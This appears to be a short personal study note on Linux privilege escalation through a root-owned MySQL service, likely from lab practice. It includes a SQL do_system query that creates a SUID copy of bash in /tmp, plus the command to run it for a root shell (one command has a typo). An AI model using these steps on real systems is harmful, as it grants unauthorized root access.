
2024-06-14 11:07

Source: #privesc 

Firstly run the linux smart enumeration script to find entry points 
check the services that can run as root, in the current machine we can connect to `mysql` w/o password and `mysqld` is running as root

Find the version of mysql by running `mysqld --version` then find an exploit that matches the version 

 in the current machine we create an SUID version of the bash shell 
 run the following query in sql then exit out and run the file with -p
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
exit

/tmp/rootbsah -p
```

### References
[[Privilege Escalation]]